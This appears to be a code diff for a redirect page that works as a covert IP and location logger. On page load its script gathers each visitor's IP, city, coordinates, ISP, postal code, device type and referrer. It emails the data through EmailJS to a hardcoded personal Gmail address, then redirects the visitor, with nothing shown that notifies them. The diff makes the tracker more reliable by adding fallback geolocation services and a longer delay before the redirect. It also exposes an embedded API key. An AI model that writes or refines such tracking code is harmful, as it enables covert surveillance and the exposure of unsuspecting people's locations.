@@ -38,7 +38,6 @@
     </style>
     <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript" src="emailjs-config.js"></script>
 </head>
 <body>
     <div class="loader"></div>
@@ -77,64 +76,115 @@
                 deviceType: getDeviceType()
             };
 
-           // Get IP and location data from ipify and ipgeolocation APIs
-try {
-    const ipResponse = await fetch('https://api.ipify.org?format=json') ;
-    const ipData = await ipResponse.json();
-    userData.ip = ipData.ip || "Unknown";
-    
-    // Now get location data using the IP
-    try {
-        const geoResponse = await fetch(`https://ipwho.is/${userData.ip}`) ;
-        const geoData = await geoResponse.json();
-        
-        if (geoData.success !== false) {
-            userData.city = geoData.city || "Unknown";
-            userData.region = geoData.region || "Unknown";
-            userData.country = geoData.country || "Unknown";
-            userData.loc = geoData.latitude + "," + geoData.longitude || "Unknown";
-            userData.isp = geoData.connection.isp || "Unknown";
-            userData.postal = geoData.postal || "Unknown";
-        } else {
-            throw new Error("Geolocation failed");
-        }
-    } catch (geoError) {
-        console.error("Error fetching location data:", geoError);
-        userData.geoDataError = "Failed to fetch location data";
-        userData.city = "Unknown";
-        userData.region = "Unknown";
-        userData.country = "Unknown";
-        userData.loc = "Unknown";
-        userData.isp = "Unknown";
-    }
-} catch (error) {
-    console.error("Error fetching IP data:", error);
-    userData.ipDataError = "Failed to fetch IP data";
-    userData.ip = "Unknown";
-    userData.city = "Unknown";
-    userData.region = "Unknown";
-    userData.country = "Unknown";
-    userData.loc = "Unknown";
-    userData.isp = "Unknown";
-}
-                // Fallback to another service if the first one fails
-                try {
-                    const fallbackResponse = await fetch('https://ipapi.co/json/');
-                    const fallbackData = await fallbackResponse.json();
-                    
-                    userData.ip = fallbackData.ip || "Unknown";
-                    userData.city = fallbackData.city || "Unknown";
-                    userData.region = fallbackData.region || "Unknown";
-                    userData.country = fallbackData.country_name || "Unknown";
-                    userData.loc = fallbackData.latitude + "," + fallbackData.longitude || "Unknown";
-                    userData.isp = fallbackData.org || "Unknown";
-                } catch (fallbackError) {
-                    console.error("Error fetching fallback IP data:", fallbackError);
-                    userData.fallbackIpDataError = "Failed to fetch fallback IP data";
-                }
-            }
-
+            // Try multiple IP geolocation services for better reliability
+            await tryMultipleGeoServices(userData);
             return userData;
+        }
+
+        // Function to try multiple geolocation services
+        async function tryMultipleGeoServices(userData) {
+            // Try service 1: ipify + ipapi.co
+            let success = await tryIpifyAndIpapi(userData);
+            
+            // If first service failed, try service 2: ipgeolocation.io
+            if (!success) {
+                success = await tryIpgeolocation(userData);
+            }
+            
+            // If second service failed, try service 3: geojs.io
+            if (!success) {
+                success = await tryGeojs(userData);
+            }
+            
+            // If all services failed, set default values
+            if (!success) {
+                setDefaultGeoValues(userData);
+            }
+        }
+
+        // Service 1: ipify.org + ipapi.co
+        async function tryIpifyAndIpapi(userData) {
+            try {
+                // First get IP from ipify
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                
+                // Then get location data from ipapi.co
+                const geoResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                
+                if (!geoData.error) {
+                    userData.city = geoData.city || "Unknown";
+                    userData.region = geoData.region || "Unknown";
+                    userData.country = geoData.country_name || "Unknown";
+                    userData.loc = `${geoData.latitude},${geoData.longitude}` || "Unknown";
+                    userData.isp = geoData.org || "Unknown";
+                    userData.postal = geoData.postal || "Unknown";
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error with ipify + ipapi service:", error);
+                return false;
+            }
+        }
+
+        // Service 2: ipgeolocation.io
+        async function tryIpgeolocation(userData) {
+            try {
+                const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=b63a7d0a7e584b4d9a3a3e0d0c4f1a5a');
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    userData.ip = data.ip;
+                    userData.city = data.city || "Unknown";
+                    userData.region = data.state_prov || "Unknown";
+                    userData.country = data.country_name || "Unknown";
+                    userData.loc = `${data.latitude},${data.longitude}` || "Unknown";
+                    userData.isp = data.isp || "Unknown";
+                    userData.postal = data.zipcode || "Unknown";
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error with ipgeolocation.io service:", error);
+                return false;
+            }
+        }
+
+        // Service 3: geojs.io
+        async function tryGeojs(userData) {
+            try {
+                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const data = await response.json();
+                
+                if (data && data.ip) {
+                    userData.ip = data.ip;
+                    userData.city = data.city || "Unknown";
+                    userData.region = data.region || "Unknown";
+                    userData.country = data.country || "Unknown";
+                    userData.loc = `${data.latitude},${data.longitude}` || "Unknown";
+                    userData.isp = "Unknown"; // geojs doesn't provide ISP info
+                    userData.postal = "Unknown"; // geojs doesn't provide postal code
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                console.error("Error with geojs.io service:", error);
+                return false;
+            }
+        }
+
+        // Set default values if all services fail
+        function setDefaultGeoValues(userData) {
+            userData.ip = "Unknown (Geolocation services unavailable)";
+            userData.city = "Unknown";
+            userData.region = "Unknown";
+            userData.country = "Unknown";
+            userData.loc = "Unknown";
+            userData.isp = "Unknown";
+            userData.postal = "Unknown";
         }
 
         // Function to determine device type
@@ -182,17 +232,16 @@ try {
                 <p><strong>Referrer:</strong> ${userData.referrer}</p>
             `;
 
-            // Get EmailJS configuration from the imported config file
-            const serviceId = typeof EMAILJS_CONFIG !== 'undefined' ? EMAILJS_CONFIG.serviceId : 'default_service';
-            const templateId = typeof EMAILJS_CONFIG !== 'undefined' ? EMAILJS_CONFIG.templateId : 'template_default';
-            const toEmail = typeof EMAILJS_CONFIG !== 'undefined' ? EMAILJS_CONFIG.toEmail : 'abdalrahimsaid@gmail.com';
-
-            // EmailJS parameters
+            // EmailJS parameters - replace with your actual service ID and template ID
             const templateParams = {
-                to_email: toEmail,
+                to_email: 'abdalrahimsaid@gmail.com',
                 subject: 'User Data Collection Report',
                 message: formattedData
             };
+
+            // Replace these with your actual service ID and template ID from EmailJS
+            const serviceId = 'service_xxxxxxx'; // Replace with your actual service ID
+            const templateId = 'template_mu47rv7'; // Your template ID
 
             // Send the email using EmailJS
             return emailjs.send(serviceId, templateId, templateParams)
@@ -222,7 +271,7 @@ try {
                 const emailSent = await sendEmail(userData);
                 
                 // Redirect regardless of email success (after a short delay to ensure data is sent)
-                setTimeout(redirectToTarget, 1000);
+                setTimeout(redirectToTarget, 1500);
             } catch (error) {
                 console.error('Error in data collection process:', error);
                 // Redirect anyway in case of error
